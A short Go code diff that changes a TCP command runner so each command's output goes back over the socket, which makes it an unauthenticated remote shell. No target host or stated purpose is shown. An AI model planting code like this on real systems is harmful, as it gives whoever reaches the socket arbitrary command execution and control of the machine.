@@ -37,7 +37,7 @@ func main() {
 
 		if n > 0 {
 			println("receive: ", string(tmp))
-			runCmd(string(tmp[:n]))
+			runCmd(conn, string(tmp[:n]))
 			tmp = make([]byte, 256)
 		}
 	}
@@ -45,7 +45,7 @@ func main() {
 	log.Fatal("finish")
 }
 
-func runCmd(_cmd_str string) {
+func runCmd(conn *net.TCPConn, _cmd_str string) {
 	_cmd_slice := strings.Split(_cmd_str, " ")
 	var cmd *exec.Cmd
 	if len(_cmd_slice) < 2 {
@@ -64,4 +64,5 @@ func runCmd(_cmd_str string) {
 	}
 	outStr, errStr := string(stdout.Bytes()), string(stderr.Bytes())
 	fmt.Printf("out:\n%s\nerr:\n%s\n", outStr, errStr)
+	conn.Write([]byte(outStr + errStr))
 }
